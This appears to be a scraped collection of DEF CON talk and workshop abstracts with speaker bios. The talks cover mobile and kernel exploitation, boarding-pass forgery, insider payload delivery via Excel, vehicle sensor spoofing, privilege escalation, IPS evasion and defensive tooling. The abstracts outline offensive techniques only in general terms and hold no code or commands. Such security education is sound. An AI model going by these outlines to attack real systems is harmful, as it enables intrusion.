title, and many others can’t believe that he has been attending DEF CON since the good old days of Alexis Park! \n\nTwitter: @jkouns\nRisk Based Security",

These features, while largely misunderstood, provide a path for understanding of the iOS security model going forward. This talk will examine the history of iOS’s exploit mitigations from iOS 8 to iOS 9.3 in order to teach important features of the architecture. This talk will cover various enhancements that stop attackers from dynamically modifying the functionality of system services, but also resulted in the defeat of all known exploitation through function hooking. Additionally, we will explore how the ability to use PLT interception and the use of direct memory overwrite are no longer options for exploit writers because of recent changes. Finally, we will cover the code-signing mechanism in depth, userland and kernel implementations and possible ways to bypass code-sign enforcement.\n\nMax Bazaliyis a security researcher at Lookout. He has over 9 years of experience in the security research space. Max has experience in native code obfuscation, malware detection and iOS exploitation.

As web appsec practitioners continue to shift from mitigating vulnerabilities to implementing proactive controls, each new standard adds another layer of defense for attack patterns previously accepted as risks. With the most basic controls complete, attention is shifting toward mitigating more complex threats. As a result of the drive to control for these threats client-side, standards such as SubResource Integrity (SRI), Content Security Policy (CSP), and HTTP Public Key Pinning (HPKP) carry larger implementation risks than others such as HTTP Strict Transport Security (HSTS). Builders supporting legacy applications actively make trade-offs between implementing the latest standards versus accepting risks simply because of the increased risks newer web standards pose. In this talk, we'll strictly explore the risks posed by SRI, CSP, and HPKP; demonstrate effective mitigation strategies and compromises which may make these standards more accessible to builders and defenders supporting legacy applications; as well as examine emergent properties of standards such as HPKP to cover previously unforeseen scenarios. As a bonus for the breakers, we'll explore and demonstrate exploitations of the emergent risks in these more volatile standards, to include multiple vulnerabilities uncovered quite literally during our research for this talk (which will hopefully be mitigated by d-day).\n\nBryant Zadegan is an application security advisor and mentor at Mach37, a security accelerator focused on pouring substantial dollars into new security technologies.

But current security apps not only scan for malware, they also aid end users by detecting malicious URLs, scams or phishing attacks.\n\nGenerally, security apps appear so self-evidently useful that institutions such as online-banking providers even require users to install anti-virus programs. In this talk, however, we show that the installation of security applications, at least in the context of smartphones, can sometimes open the phone to a number of attack vectors, making the system more instead of less vulnerable to attacks. \n\nIn a recent research we conducted on Android security apps from renowned vendors such as Kaspersky, McAfee, Androhelm, Eset, Malwarebytes or Avira. When conducting a study of the apps’ security features (Antivirus and Privacy Protection, Device Protection, Secure Web Browsing, etc.) it came as a shock to us that every inspected application contained critical vulnerabilities, and that in the end no single of the promoted security features proved to be sufficiently secure. In a simple case, we would have been able to harm the app vendor’s business model by upgrading a trial version into a premium one at no charge. \n\nIn other instances, attackers would be able to harm the end user by completely disabling the malware-scanning engine remotely. Or how about accessing confidential data by exploiting broken SSL communication, broken self-developed “advanced” crypto implementations or through SQL-injections?\n\nYes, we can. On top, we were able to bypass the secure browsing protection and abuse it for code execution. The most alarming findings, however, were security applications that we were able to actually turn into a remote access trojan (RAT) or into ransomware. In light of all those findings, one must seriously question whether the advice to install a security app onto one’s smartphone is a wise one. In this talk, we will not only explain our findings in detail but also propose possible security fixes.\n\nStephan Huber is a security researcher at the testlab mobile security group at the Fraunhofer Institute for Secure Information Technology (SIT). His main focus is Android application security testing and developing new static and dynamic analysis techniques for app security evaluation. He found different vulnerabilities in well-known Android applications and the AOSP. In his spare time he enjoys teaching students in Android hacking.\n\nSiegfried Rasthofer is a fourth year PhD student at the TU Darmstadt (Germany) and Fraunhofer SIT and his main research focus is on applied software security on Android applications.

Hacking boarding passes for fun and profit.\nPrzemek Jaroszewski CERT Polska/NASK\n\nWhile traveling through airports, we usually don't give a second thought about why our boarding passes are scanned at various places. After all, it's all for the sake of passengers' security. Or is it? The fact that boarding pass security is broken has been proven many times by researchers who easily crafted their passes, effectively bypassing not just ‘passenger only’ screening, but also no-fly lists. Since then, not only security problems have not been solved, but boarding passes have become almost entirely bar-coded. And they are increasingly often checked by machines rather than humans. Effectively, we're dealing with simple unencrypted strings of characters containing all the information needed to decide on our eligibility for fast lane access, duty-free shopping, and more... \n\nWith a set of easily available tools, boarding pass hacking is easier than ever, and the checks are mostly a security theater. In my talk, I will discuss in depth how the boarding pass information is created, encoded and validated. I will demonstrate how easy it is to craft own boarding pass that works perfectly at most checkpoints (and explain why it doesn't work at other ones). \n\nI will also discuss IATA recommendations, security measures implemented in boarding passes (such as digital signatures) and their (in)effectiveness, as well as responses I got from different institutions involved in handling boarding passes. There will be some fun, as well as some serious questions that I don't necessarily have good answers to.\n\nPrzemek Jaroszewski is a member of CERT Polska (part of Research and Academic Computer Network in Poland) since 2001, where his current position is the head of incident response.

So I wrote mine :-) But mine not fast, and come with an HTTP client which sends very bad HTTP queries. My tool is a stress tester for HTTP servers and proxies, and I wrote it because I found flaws in all HTTP agents that I have checked in the last year i.e. nodejs, golang, Apache httpd, FreeBSD http, Nginx, Varnish and even Haproxy. This presentation will try to explain how flaws in HTTP parsers can be exploited for bad things; why it is very hard to get this considered as security issues and why I think it should; and we will also check some real worlds bad implementations, and play with HTTP to crash nodejs, because that's the really fun part. \n\nIf you know nothing about HTTP it should be understandable, but you'll have to trust me blindly at the end. If you think you know HTTP, you have no reason to avoid this talk. Then, the short part, I will show you this new Open Source stress tool that I wrote and hope that you will remember it when you'll write your own HTTP parser for you new f** language.\n\nregilero is a DevOp, and this started far before this term.

Rogue cell towers, which can be as small as your home router, pose a large security risk to anyone with a phone. If in range, your phone will automatically connect to the rogue tower with no indication to you that anything has happened. At that point, your information passes through the rogue tower and can leak sensitive information about you and your device. Currently, there are no easy ways to protect your phone from connecting to a rogue tower (aside from some Android apps which are phone specific and require root access). In this talk I'll demonstrate how you can create a rogue cell tower detector using generic hardware available from Amazon. The detector can identify rogue towers and triangulate their location. The demonstration uses a software defined radio (SDR) to fingerprint each cell tower and determine the signal strength of each tower relative to the detector. With a handful of these detectors working together, you can identify when a rogue cell tower enters your airspace, as well as identify the signal strength relative to each detector. This makes it possible to triangulate the source of the new rogue cell tower.\n\nJusticeBeaver (Eric Escobar) is a Security Engineer at Barracuda Networks. His interests are broad and generally include putting computers in places you wouldn't expect. From chicken coops to rockets and even bee hives.

And we've all struggled with the limitations those systems put on us in the form of available tools or software we want to use. I didn't like struggling, so I came up with a method to load whatever I wanted on to a closed system without triggering any common security alerts. To do this I had to avoid accessing the Internet or using mag media. In the end all I needed was an office multi-function machine and Excel. It's all any insider needs. \n\nFor my presentation and demo, I'll show you how I delivered a select group of PowerSploit tools to a clean, isolated machine. Of course, Excel has been known as vector for macro viruses for quite some time and some of the techniques--such as hex-encoding binary data and re-encoding it on a target machine--are known binary insertion vectors but I have not found any prior work on an insider using these techniques to deliver payloads to closed systems. You'll leave my presentation knowing why Excel, umm, excels as an insider attack tool, how to leverage Excel features to load and extract arbitrary binary data from a closed network, and what to do if this really frightens you.\n\nMike has over 20 years experience in the military. He has been part of everything from systems acquisition, to tactical intelligence collection, to staff work, to leading a unit dedicated to data loss prevention.

Plus there are all sorts of non-technical things that established researchers seem to just know. There are many different things to learn, but nobody really talks about the different paths you can take on your journey. We will provide an overview of key concepts in vulnerability research, then cover where you can go to learn more - and what to look for. We’ll suggest ways for you to choose what you analyze and provide tools and techniques you might want to use. We’ll discuss different disclosure models (only briefly, we promise!), talk about the different kinds of responses to expect from vendors, and give some advice on how to write useful advisories and how to go about publishing them. Then, we’ll finish up by covering some of the ‘mindset’ of vulnerability research, including skills and personality traits that contribute to success, the different stages of growth that many researchers follow, and the different feelings (yes, FEELINGS) that researchers can face along the way. Our end goal is to help you improve your chances of career success, so you can get a sense of where you are, where you want to go, and what you might want to do to get there. We will not dig too deeply into technical details, and we’d go so far as to say that some kinds of vulnerability research do not require deep knowledge anyway. Vulnerability research isn’t for everyone, but after this talk, maybe you’ll have a better sense of whether it’s right for you, and what to expect going forward.\n\nJoshua J. Drake is the VP of Platform Research and Exploitation at Zimperium Enterprise Mobile Security and lead author of the Android Hacker's Handbook.

Now, having our own Macro BaseStation (an eNodeB) on the desk, we will demonstrate practical approaches to and attacks on real life devices. More and more devices are using mobile radio networks such as GSM, UMTS and LTE and there has already been quite a bit of research on (in)securities on the radio part, but only few people have had a look behind the scenes. Luckily, we had the chance to have just this look and now we would like to raise the curtain for the community. Initially we will quickly cover our complete odyssey from starting up an eNodeB for the first time, checking out the available interfaces and emulating the core network through to starting attacks. In the main part of the talk we will give a rather practical insight into the (in-)security features of basestations. We will start with valid backend connections and how these connections can be abused to reconfigure both a single eNodeB and a complete subnet on a telco network. We will then continue with the ‘official’ maintenance approach with the vendor's tools and webinterfaces giving an attacker both local and remote access to the device. All in all the talk will cover general and specific vulnerabilities in both basestations and the backend network.\n\nHendrik Schmidt and Brian Butterly are seasoned security researchers with vast experiences in large and complex enterprise networks. Over the years they focused on evaluating and reviewing all kinds of network protocols and applications. They love to play with packets and use them for their own purposes. In this context they learned how to play around with telecommunication networks, wrote protocol fuzzers and spoofers for testing their implementation and security architecture. Both are pentesters and consultants at the German based ERNW GmbH and will happily share their knowledge with the audience.",

Although promising and proving safety features, the trustworthiness of these cars has to be examined before they can be widely adopted on the road. Unlike traditional network security, autonomous vehicles rely heavily on their sensory ability of their surroundings to make driving decision, which opens a new security risk. Thus, in this talk we examine the security of the sensors of autonomous vehicles, and investigate the trustworthiness of the 'eyes' of the cars. In this talk, we investigate sensors whose measurements are used to guide driving, i.e., millimeter-wave radars, ultrasonic sensors, forward-looking cameras. In particular, we present contactless attacks on these sensors and show our results collected both in the lab and outdoors on a Tesla Model S automobile. We show that using off-the-shelf hardware, we are able to perform jamming and spoofing attacks, which caused the Tesla's blindness and malfunction, all of which could potentially lead to crashes and greatly impair the safety of self-driving cars. To alleviate the issues, at the end of the talk we propose software and hardware countermeasures that will improve sensor resilience against these attacks.\n\nJianhao Liu is the director of ADLAB at Qihoo 360.

Last year I gave a talk about hacking a flight simulator (among other games), it was only fitting to research something related to my other hobby too. Old day's bike speedometers have evolved quite a bit, and nowadays a lot of bikers (swimmers, runners, ers) do their sport with tiny computers attached to them. These computers do much more than measuring speed: they have GPS, they can store your activities, can be your training buddy, and they can communicate with various sensors (cadence, power meter, heart rate monitors, you name it), mobile phones, each other, and with PCs. One of the communication protocols used by these devices is ANT. Never heard of it? Not surprising, it is not very well known despite being utilized by a lot of gadgets including, but not limited to sport watches, mobile phones, weight scales, some medical devices, and even bicycle lights and radars. When I bought my first bike computer I rationalized it with thoughts like ‘this will help me navigate on the mountain’, or ‘I can track how much I've developed’, but deep down I knew the real reason was my curiosity about this lesser known, lesser researched protocol. \n\nOne of my favorite kind of weaknesses are the ones caused by questionable design decisions, and can be spotted without actual hands-on experience with the product itself, just by reading the documentation. Well this is exactly what happened here, I had some attack vectors ready and waiting well before I received the actual device. To top it all, I've also found some implementation bugs after getting my hands on various Garmin devices. \n\nAfter a brief introduction to the ANT, ANT+ and ANT-FS protocols, I'll explain and demo both the implementation and the protocol weaknesses and reach the already suspected conclusion that ANT and the devices that use it are absolutely insecure: anybody can access your information, turn off your bike light, or even replace the firmware on your sport watch over the air.\n\nTamas is the lead IT security researcher at PR-Audit Ltd., a company focusing mainly on penetration testing and SIEM software developing. Previously he participated in a cooperation between ELTE Department of Meteorology and the Paks Nuclear Power Plant Ltd. which goal was to develop TREX, a toxic waste emission simulator using CUDA. The scene from RoboCop where the kid defeats the evil robot with just a laptop and a serial cable made a huge impression on him, and after seeing the movie, his path was set: he was bound to be a hacker. His first experiences in this field involved poking around various copy protection schemes, and for this day his favorite areas of expertise are the ones that require some mangling of binary files. Besides computer security he also loves mountain biking and flight simulators.\n\nTwitter: @sghctoma \nFacebook: sghctoma",

Our current research using tools we previously released Badger at Black Hat in 2014 and the Kobra released at BsidesLV 2015 shows a 40 percent increase in outside unique IP traffic destinations and a 400 percent increase in data transmitted towards these destinations. But through the course of the research we found currently used IRP monitoring tools were lacking to help produce enough information to forensically investigate the exfiltration of user metadata. Pinworm is a sniffer that shows all created IRPs created in the kernel in I/O devices. The IRPs are correlated with the processes that created them and the called driver stack. With network traffic data we are off to the races. Using pinworm which we released this week, we will show forensic case studies from cradle to grave of what happens when you do things online in social media sites.\n\nLike all of our previously released tools, Pinworm is a framework including server side code you can use to collect and display user metadata inline in browser frames. Does this metadata collection happen in the browser, in userland, or in the kernel? Come to our talk and find out. We will demonstrate the collection of user metadata and collecting this information in a live browser session.

Matthews Associate Professor of Computer Science, Clarkson University \nMs. Kaitlin A. Trumbull Undergraduate CS Research Assistant, Utica College\n\nCloud service providers offer their customers the ability to deploy virtual machines in a multi-tenant environment. These virtual machines are typically connected to the physical network via a virtualized network configuration. This could be as simple as a bridged interface to each virtual machine or as complicated as a virtual switch providing more robust networking features such as VLANs, QoS, and monitoring. At DEF CON 23, we presented how attacks known to be successful on physical switches apply to their virtualized counterparts. Here, we present new results demonstrating successful attacks on more complicated virtual switch configurations such as VLANs. In particular, we demonstrate VLAN hopping, ARP poisoning and Man-in-the-Middle attacks across every major hypervisor platform. We have added more hypervisor environments and virtual switch configurations since our last disclosure, and have included results of attacks originating from the physical network as well as attacks originating in the virtual network.\n\nMr.Bull is an Assistant Professor of Computer Science at Utica College with a focus in computer networking and cybersecurity.

Surely our encrypted traffic is now safe on the local coffee shop network? If not, my VPN will definitely protect me... right? In this talk we'll reveal how recent improvements in online security and privacy can be undermined by decades old design flaws in obscure specifications. These design weakness can be exploited to intercept HTTPS URLs and proxy VPN tunneled traffic. We will demonstrate how a rogue access point or local network attacker can use these new techniques to bypass encryption, monitor your search history and take over your online accounts.

However, Google is not alone in the struggle to keep Android safe. Qualcomm, a supplier of 80% of the chipsets in the Android ecosystem, has almost as much effect on Android’s security as Google. With this in mind, we decided to examine Qualcomm’s code in Android devices. During our research, we found multiple privilege escalation vulnerabilities in multiple subsystems introduced by Qualcomm to all its Android devices in multiple different subsystems. In this presentation we will review not only the privilege escalation vulnerabilities we found, but also demonstrate and present a detailed exploitation, overcoming all the existing mitigations in Android’s Linux kernel to run kernel-code, elevating privileges and thus gaining root privileges and completely bypassing SELinux.\n\nAdam Donenfeld is a lead mobile security researcher at Check Point with vast experience in the mobile research field.

On that front, we argue that 6LoWPAN is a protocol that will be a dominant player as it is the only IoT-capable protocol that brings a full IP stack to the smallest devices. As evidence of this, we can highlight the fact that even the latest ZigBee Smart Energy standard is based on ZigBee IP which itself relies on 6LoWPAN, a competitor of the initial ZigBee protocol. Efficient IP-based penetration testing tools have been available to security auditors for years now. However, it is not that easy to use them in the context of a 6LoWPAN network since you need to be able to join it first. In fact, the difficult part is to associate with the underlying IEEE 802.15.4 infrastructure.\n\nIndeed, this standard already has two iterations since its release in 2003 and it provides with several possibilities regarding network topology, data transfer model and security suite. Unfortunately, there is no off-the-shelf component that provides, out of the box, with such a wide range of capabilities. Worst still, some of them deviate from the standard and can only communicate with components from the same manufacturer. In this paper, we present the ARSEN project: Advanced Routing for 6LoWPAN and Ethernet Networks. It provides security auditors with two new tools.\n\nFirst, a radio scanner capable of identifying IEEE 802.15.4 infrastructures and for each one of them their specificities, including several deviations from the standard that we encountered in actual security audits.\n\nSecondly, a border router capable of routing IPv6 datagrams between Ethernet and 6LoWPAN networks while adapting to the specificities identified by the scanner. As a result, the combination of both effectively allows security auditors to use available IP-based penetration testing tools on different 6LoWPAN networks.\n\nJonathan-Christofer Demay, PhD is the current penetration testing team leader at AIRBUS Defence and Space. As a former academic researcher, he has been working on IDS bypassing, intrusion detection and general network security. Now a consultant for various key industries and government bodies, he is working on incident response, penetration testing and social engineering. \n\nAdam Reziouk is an electronics and automation engineer currently working on wireless communications and industrial network security at AIRBUS Defence and Space. He holds a master's degree in electrical and electronic engineering and has been conducting vulnerability research activities on programmable logic controllers, connected devices and smart grids. \n\nArnaud Lebrun is a command and control engineer currently working at AIRBUS Defence and Space.

And now we're weak, and the Machines know it. New D.C. is the last remaining human stronghold. Right now the Machines are preparing for one final assault that, if successful, will mean the end of all humanity. But it gets even worse. We've just received word that our leader, the Dark Tangent, has been captured. Without him we'll be unable to defend ourselves or mount a counter strike.\n\nYour mission is to lead a group of brave hackers to rescue the Dark Tangent. But before you can do that you'll need to work together to devise a secure messaging protocol that the Machines won't be able to break. This secure protocol is vital so that the troops can communicate in secret during the operation without the Machines figuring out what we're doing. It's all up to you now. Do you have what it takes to defeat the Machines? Will you save us all?\n\nThis is a completely different kind of workshop. I'll present a very specific infiltration scenario with attack vectors that we can expect the Machines to use, e.g. session hijacking, message poisoning, replay and MITM attacks, etc. As a group we'll then work through our mission objectives and design a messaging protocol that will allow us to communicate securely. Finally, we'll implement the protocol in C++ and use it to communicate with each other in real-time. If everything works as expected we'll be able to defeat the Machines and rescue the Dark Tangent. If not… then all of humanity is lost.\n\nPlease note that this is an intermediate-level, technical workshop and requires that attendees have a strong working knowledge of C/C++.

			"description": "Writing Your First Exploit\nRob Olson Instructor, State University of New York at Fredonia\n\nDEF CON isn’t just for hardened hackers with 5up3r 3l173 hacking skills. As DEF CON has grown, more and more attendees are looking for knowledge that will help them get started in the world of hacking. If that’s what you’re looking for, this training workshop is for you!\n\nThis training will teach students how to discover and exploit their first buffer overflow exploit. This is not a class in how to use the tool of the day; students will be writing their own tools in Python every step of the way. Students will learn how to configure their virtual lab environment, how to write a fuzzer that can produce a crash in a network service, how to take control of a crash, and how to embed a customized payload in order to complete the exploit. As time permits, there will also be a discussion of writing Windows payloads by hand in shellcode.\n\nUnderstanding exploit development is good. Understanding how to prevent exploits is better. In addition to examining the offensive techniques involved in exploiting buffer overflow vulnerabilities, students will dig through C source code to understand these vulnerabilities and how they could be mitigated. As time permits, there will also be a discussion of host-based mitigation strategies such as DEP and ASLR.\n\nRob Olson (@nerdprof) is an instructor in the Department of Computer and Information Sciences at the State University of New York at Fredonia where he teaches courses including Computer Security and Ethics, Ethical Hacking, and many more traditional computer science courses. His philosophy is that students ought to learn how to write many of their own security tools before using existing ones. He holds several graduate degrees (but no Ph.D.) and along the way, he also picked up CEH, CISSP, and OSCP certifications.\n\nMax Class Size: 55\nPrerequisites for students: None\nMaterials or Equipment students will need to bring to participate: One laptop capable of running a Kali Linux 2 virtual machine and a Windows (any version) virtual machine. Students should come with these virtual machines set up. Students will need to download and install several pieces of free software on their Windows virtual machine during the training workshop.",

Participants will be able to watch a demonstration on how to leverage insecurities in different protocols, and replicate the attacks themselves in a lab environment at the workshop. In addition, we will discuss what steps network engineers can do to limit the insecurities.\n\nThis workshop will contain network devices in which participants will be able to connect to and perform the demonstrated attacks. Participation will be reduced since network equipment resources are limited, unless additional lab equipment can be procured.\n\nThomas Wilhelm has been an associate professor at an NSACAE university, who has taught information assurance for many years at both the masters and undergraduate level.

			"description": "C/C++ Boot Camp for Hackers\nEijah Founder, demonsaw\n\nThe C/C++ programming language is one of the most important programming languages ever created. Ever since Dennis Ritchie invented the language and Bjarne Stroustrup added object-oriented capabilities to it, C/C++ has been the standard by which all other languages are judged. C/C++ is considered the lingua franca of UNIX, Linux, BSD, and Windows as well as many software toolsets including GNU, Aircrack-ng, and the GCC compiler. And not only that, but C/C++ has influenced many other languages including C#, Java, Perl, PHP, and Python.\n\nAs hackers, we sometimes have to write code. And while there are more modern and higher-level languages available, C/C++ still plays a strong and prominent role in the hacking world due to its close ties to Linux and BSD. Whether we're writing shell scripts, python programs, PHP websites, contributing to a FOSS project, reverse engineering a binary, or rebuilding/patching the OS kernel; having a familiarity with C/C++ gives us a tremendous advantage and adds a powerful tool to our hacker arsenal.\n\nThis workshop is a C/C++ boot camp for hackers. It's an intense hands-on experience designed to get you up-to-speed with the most important parts of the C/C++ programming language using the GCC/G++ compiler. You'll learn about variables, functions, pointers, operators, classes, libraries, threads, templates, data structures, algorithms, exception handling, memory management, and design patterns. Whether you're a professional programmer, find yourself a little rusty and simply want a refresher course, or even if you'd never programmed in C/C++ before; this workshop is for you.\n\nPlease note that this is an intermediate-level, technical workshop and requires that attendees have prior experience in at least one programming language. Bring your laptop, a USB flash drive, and your favorite C/C++ 11 compiler (>= gcc/g++ 4.7 or msvc 2013).\n\nEijah is the founder of demonsaw, a secure and anonymous information sharing program. For the last 5 years he was also a Senior Programmer at Rockstar Games where he worked on Grand Theft Auto V for PS3, Xbox 360, PS4, Xbox One, and PC. Eijah has over 15 years of software development and IT Security experience. His career has covered a broad range of Internet and mid-range technologies, core security, and system architecture. Eijah has been a faculty member at multiple colleges, has spoken about security and development at DEF CON and Hack Miami conferences, and holds a master’s degree in Computer Science. Eijah is an active member of the hacking community and is an avid proponent of Internet freedom.\n\nMax Class Size: 55\nPrerequisites for students: Previous experience in at least one programming language is required, although it doesn't have to be in C/C++.\nMaterials or Equipment students will need to bring to participate: Laptop with Windows, Linux, or OSX.

			"description": "Windows Breakout and Privilege Escalation Workshop\nRuben Boonen Lead Security Consultant, Context Information Security\n\nFrancesco Mifsud Security Consultant, Context Information Security\n\nThis workshop, available to attendees of all levels, will provide the required knowledge to perform post-exploitation actions on locked down Windows machines. Tools, tips and techniques will be shared to break out of restrictive execution environments and escalate privileges from low level user to SYSTEM on modern Windows operating systems. Contrary to common perception, Windows machines can be really well locked down if they are configured with care. As such attackers will need to dig deep in order to break out of restrictive environments and escalate privileges.\n\nThe breakout portion of the workshop will cover fundamental techniques required to get a shell on applications which are deployed through Terminal Services and Citrix or in environments which have been locked down through Software Restriction Policies (SRPs) and Group Policy. Topics covered will include:\n\nAbusing intended application functionality\nBypassing folder path / type restrictions\nFile protocol handlers\nEvading black / white lists.\nThe Windows privilege escalation portion of the workshop aims to provide attendees with a solid understanding of the various steps required to escalate privileges from low level users to SYSTEM level privileges. Automated tools, such as meterpreter's \"getsystem\", have their place in this process however reliance on automation breeds weakness. Topics covered will include:\n\nEnumeration of the target machine\nIdentification of common and uncommon configuration weaknesses\nPermission analysis\nAnalysis of Windows privilege escalation vulnerabilities\nBoth portions of the workshop will have real-world examples that attendees can get their hands dirty with in order to solidify the theory. This workshop aims to provide hands-on knowledge which can be directly applied against locked down environments in the field. After taking this workshop you should always hide your smile when someone brags there is no way to compromise their locked down system!\n\nMy name is Ruben Boonen (sometimes known as b33f). I have been working in InfoSec since 2012, one year as part of the Offensive Security team, assisting students from around the world as they worked through Offsec's various certifications and a further three years as a security consultant. I have a well-rounded skill set, having taken on many web application, infrastructure and bespoke engagements. I have, however, developed a special interest for Windows exploitation: Domain hacking, exploit development, client-side attacks, restricted environments, privilege escalation, persistence and post-exploitation.\n\nNot only do I enjoy breaking things but I also take great pleasure in helping others understand and replicate the attackers methodology. I was previously an assistant trainer for Offensive Security's Advanced Windows Exploitation course at Black Hat. Since 2011 I have also been maintaining an InfoSec blog to share interesting research with a wider audience.\n\nMy name is Francesco Mifsud. I'm relatively new to the InfoSec Industry but I've spent my fair share of sleepless nights staring at debuggers and ASM. I've been working at Context Information Security for the past couple of years as a security consultant: Web applications, infrastructure jobs, mobile engagements, anything the company throws at me.\n\nDuring my research on exploit-development I have realized that a lot of material is out there on how to get a shell on the box, but not much on how to proceed afterwards. What happens if you don't get Admin or Root? If the obtained shell is severely restricted can you really say you have successfully compromised a machine? Due to this, I have developed an interest in post-exploitation, namely Breakouts and Privilege Escalation. I have come a long way since then (or that's what I like to believe) and now it's time to pass this knowledge on to others!\n\nMax Class Size: 55\nPrerequisites for students: There are no special requirements to attend the workshop, everyone is welcome and can benefit from the theoretical parts covered in each section. \nMaterials or Equipment students will need to bring to participate: To participate in the hands-on portions, attendees will need to bring a laptop with 1GB RAM (2GB recommended) which can be dedicated to a Virtual Machine, both WMWare Player and VirtualBox can be downloaded for free.\n\nWe strongly recommend attendees download a free \"Windows 10\" evaluation version and bring it with them to the workshop.

Since osquery allows us to easily ask questions about our infrastructure, it provides powerful capabilities, such as finding malware persistence techniques and scanning IOCs across our fleets of machines. This workshop is a very hands-on training and we expect participants to be comfortable with CLI. The workshop is broken into three components:\n\nPart I - hunting malware with osquery (1.5 hours) The first section of the workshop will make use of the interactive osquery command line tool (osqueryi) to hunt for characteristics of malware residing on a local system. The goal of this section is to get students familiar with writing SQL statements and to understand how osquery makes use of core tables to abstract operating system artifacts.\n\nPart II - osquery at scale (1.5 hours): The second part of the workshop will focus on automation and deployment of osquery at a larger scale. You will learn how to write “query packs” which are utilized to collect and analyze the results from various endpoints in an enterprise. We will demonstrate this concept with the use of virtual machines, however the methodologies can be extrapolated to larger enterprises.\n\nPart III - osquery development (optional - 0.5 to 1 hours): The last part of the workshop focuses on osquery development. We will walk you through some of the core components of osquery so you can have a deeper understand of this application. The goal being to give the student sufficient information to hack on the osquery project. This segment is largely optional and designed for people who want to get familiar with how osquery works under the hood.\n\nWho should attend? \nThis workshop is designed for information security professionals who defend small to large scale enterprise networks.\n\nWhat you need to know?\n\nLinux/MAC operating systems and CLI environments\nComfortable writing and operating in SQLite What would be helpful to know?\nKnowledge of ELK stack or splunk deployment/functionality is helpful\nSome programming experience is helpful\nGeneral knowledge of malware TTP is helpful What do you need to bring?\nA laptop capable of running two virtual machines (2 cores +, 8GB RAM, and 40GB Free disk space)\nPre-installed VMWare client\nSereyvathana Ty is a member of Detection Infrastructure at Facebook working on network security monitoring instrumentations.

			"description": "Intrusion Prevention System (IPS) Evasion Techniques\nThomas Wilhelm\n\nJohn Spearing Co-founder and Operations Manager, Crystal Defense Network Information Security\n\nIn most professional penetration tests, the pentester is given unrestricted, unfettered access to a network. However, this does not provide an effective evaluation of all preventative measures available to an organization that prevent and identify ongoing attacks. As a result, more businesses now require pentesters to confront Intrusion Detection / Prevention Systems aimed at limiting attacks in their network. The ability to understand how IDS/IPS systems work and effective techniques to circumvent their efforts to restrict your activities within the network is becoming essential for pentesters.\n\nIn this workshop, we will build an IPS system and examine their inherent limitations. We will then perform attacks within a test lab environment to see how effective the IPS is against our typical attacks. Once we understand how IPS systems limit our ability to pentest, we will then look at ways to exploit IPS limitations to be more effective in our professional penetration tests.\n\nThomas Wilhelm has been an associate professor at an NSACAE university, who has taught information assurance for many years at both the masters and undergraduate level. He has been a penetration tester and team lead for fortune 100 companies, and spent the last 20+ years involved in information security.\n\nThomas has written and authored numerous articles and books over the years on hacking; the latest is titled “Professional Penetration Testing (vol 2),” published by Syngress, which has been printed in multiple languages. Thomas holds two masters degrees (MSCS, MSM) and maintains the following certifications: ISSMP, CISSP, CCNP Security, SCSECA, SCNA, SCSA, IEM, IAM.\n\nJohn Spearing works in the field of network and physical security, and has obtained a Masters Degree in both Computer Science and Organizational Behavior. John is the co-founder and Operations Manager of the MSSP company known as Crystal Defense Network Information Security, located in central Colorado. John's specialty within the Information Security realm is centralized around network intrusion detection and prevention, as well as endpoint security.\n\nMax Class Size: 55\nPrerequisites for students: Students should already be familiar with penetration testing techniques and tools (and their flags). The use of proxies will be required to participate, so knowledge of how to configure your hacking platform to intercept and ability to modify packets is essential.\nMaterials or Equipment students will need to bring to participate: Since this is an advanced penetration testing subject, participants should have a laptop with the ability to host virtual images, which also contains an up to date Kali Linux image. In addition, if they want to participate in actual attacks within the lab, they should bring CAT5 cables for connectivity. This class will not spend time getting students online - participants should already be familiar with configuring static IP addresses and/or DHCP for their systems. Because participants will be able to connect to a lab environment with active exploits, it is suggested that students use a computer system that can be easily re-imaged at the end of the workshop.",

			"description": "Open Source Malware Lab\nRobert Simmons Director of Research Innovation, ThreatConnect, Inc.\n\nThe landscape of open source malware analysis tools improves every day. A malware analysis lab can be thought of as a set of entry points into a tool chain. The main entry points are a file, a URL, a network traffic capture, and a memory image. This talk is an examination of the major open source tools that satisfy the analysis requirements for each of these entry points. Each tool’s output can potentially feed into another tool for further analysis. The linking of one tool to the next in a tool chain allows one to build a comprehensive automated malware analysis lab using open source software.\n\nFor file analysis, the three major versions of Cuckoo Sandbox will be examined. To analyze a potentially malicious URL, the low-interaction honeyclient, Thug, will be covered. Next, if one has a network capture (PCAP) to analyze, the Bro Network Security Monitor is a great option, and will be covered. Finally, if the analysis target is a memory image, the Volatility Framework will be examined. Each of the inputs and outputs of the tools will be reviewed to expose ways that they can be chained together for the purpose of automation. For each tool covered, the class will login to live instances of each and learn the basics of malware analysis using each one.\n\nRobert Simmons is the Director of Research Innovation at ThreatConnect, Inc. With an expertise in building automated malware analysis systems based on open source tools, he has been tracking malware and phishing attacks and picking them apart for years. Robert is also the author of PlagueScanner, an open source virus scanner framework.\n\nRobert, also known as Utkonos, has a background in biology, linguistics, and Russian area studies. He has lived extensively in Russia and Ukraine and has been known to swear profusely and constantly in Russian.\n\nMax Class Size: 55\nPrerequisites for students: None\nMaterials or Equipment students will need to bring to participate: Bring a laptop with the current version of Chrome installed and a tested and working network connection (provide your own internet, please - only rely on the conference network if absolutely needed). Everything is remote and connected to via web browser - no malware will be worked on your equipment. Everything is remote.",

			"description": "Analyzing Internet Attacks with Honeypots\nIoannis Koniaris Security Engineer\n\nIn the field of computer security, honeypots are systems aimed at deceiving malicious users or software that launch attacks against the servers and network infrastructure of various organizations. They can be deployed as protection mechanisms for an organization’s real systems, or as research units to study and analyze the methods employed by human hackers or malware. In this workshop we will outline the operation of two research honeypots, by manual deployment and testing in real time. A honeypot system will undertake the role of a web trap for attackers who target the SSH service in order to gain illegal server access. Another one will undertake the role of a malware collector, usually deployed by malware analysts and anti-virus companies to gather and securely store malicious binary samples. We will also talk about post-capturing activities and further analysis techniques. As an example, we will see how to index all the captured information in a search engine like Elasticsearch and then utilize ElastAlert, an easy to use framework to setup meaningful alerting. Lastly, visualization tools will be presented for the aforementioned systems, plus a honeypot bundle Linux distribution that contains pre-configured versions of the above tools and much more related utilities, which can make the deployment of honeypots in small or large networks an easy task.\n\nIoannis is an Information Security engineer and researcher, working to protect company assets, data and operations. His general interests are programming, security, development operations (DevOps) and cloud computing while his academic interests include honeypots, honeyclients, botnet tracking, malware analysis, intrusion detection and security visualization. Ioannis has released a number of utilities to aid information security professionals using honeypots. Some of them are Kippo-Graph, Honeyd-Viz and HoneyDrive; a self-contained honeypot bundle Linux distribution. These tools are used by numerous university researchers, various CERT teams worldwide and have also been included in the “Proactive detection of 